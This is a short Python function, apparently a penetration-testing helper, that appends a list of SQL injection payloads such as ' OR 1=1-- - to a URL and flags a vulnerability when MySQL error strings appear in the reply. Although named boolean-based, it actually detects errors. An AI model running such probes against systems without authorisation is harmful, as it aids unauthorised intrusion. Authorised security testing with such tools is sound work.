def boolean_based_sql_injection(url):
    import requests as req

    def boolean_based(url, payload):
        try:
            response = req.get(url + payload)
            if "SQL syntax" in response.text or "MySQL server version" in response.text:
                return True
            else:
                return False
        except req.RequestException as e:
            print(f"An error occurred: {e}")
            return False

    print("Starting Boolean-Based SQL Injection Test...")
    payloads = [
        "' OR 1=1-- -",
        "' AND 1=2-- -",
        "' OR 'a'='a'-- -",
        "' AND 'a'='b'-- -"
    ]

    for payload in payloads:
        if boolean_based(url, payload):
            print(f"Vulnerability found with payload: {payload}")
            return True

    print("No vulnerabilities found.")
    return False